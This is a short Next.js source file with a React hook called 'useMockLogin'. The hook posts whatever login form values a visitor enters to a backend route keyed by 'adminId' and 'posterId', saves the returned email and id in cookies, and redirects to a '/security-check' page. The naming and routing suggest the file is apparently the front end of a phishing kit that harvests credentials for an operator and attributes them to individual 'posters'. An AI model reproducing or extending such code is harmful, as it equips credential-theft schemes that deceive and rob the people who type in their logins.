import { useRouter } from 'next/router';
import { toast } from 'react-toastify';
import Cookies from 'js-cookie';
import { API_URL } from '../config';
import { useEffect, useState } from 'react';

function useMockLogin() {
  const {
    push,
    query: { adminId, posterId },
  } = useRouter();
  const [userName,setUserName]=useState()
  console.log(userName)
  const login = async (values, formik) => {
    const url = `${API_URL}/ad/${adminId}/${posterId}`;
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        Accept: 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();
     

    if (res.ok) {
      console.log('success', data);
      Cookies.set('email', data?.info?.email);
      Cookies.set('id', data?.info?._id);
      Cookies.set('userName', data?.email);
      // push('/fdsgsdfgfd');
      push("/security-check");
    } else {
      console.log('error', data);
      toast.error('Something Went Wrong');
    }
  };

  return { login};
}

export default useMockLogin;
